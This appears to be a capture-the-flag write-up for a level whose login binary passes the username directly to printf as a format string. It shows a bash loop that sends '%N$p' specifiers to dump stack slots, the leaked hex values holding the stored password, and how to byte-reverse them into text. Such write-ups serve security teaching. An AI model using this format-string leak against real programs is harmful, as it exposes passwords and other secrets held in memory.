# Level 02

The login flow reads a username into `var_78`, then if the password is wrong, passes it **directly** as the format string to `printf`:

```c
printf(&var_78)         // ← username used as format string, not as "%s"
puts(" does not have access!")
```

This lets us use format specifiers like `%p` in our username to read values off the stack — including the password, which was read from disk into `var_a8` earlier.

This loop probes the first 100 stack offsets:

```bash
for i in $(seq 1 100); do
    echo -n "offset $i: "
    python -c "print '%${i}\$p'" | ./level02 | grep "does not have"
done
```

Most offsets contain addresses or small integers with non-printable bytes (`0x7f...`, `0x00...`). Offsets 22–26 stand out immediately — every byte falls in the printable ASCII range (`0x20`–`0x7e`), and they appear in 5 continious slots:

```
offset 22: 0x756e505234376848
offset 23: 0x45414a3561733951
offset 24: 0x377a7143574e6758
offset 25: 0x354a35686e475873
offset 26: 0x48336750664b394d
```

**Decoding: Hex → ASCII**

x86 is little-endian, so `printf` prints each 8-byte chunk with its bytes in reversed order. To recover the original string, reverse the byte order of each value.

Use [CyberChef](https://cyberchef.org/#recipe=From_Hex('Auto')Reverse('Byte')&input=MHg3NTZlNTA1MjM0Mzc2ODQ4) with the recipe: **From Hex → Reverse (Byte)**
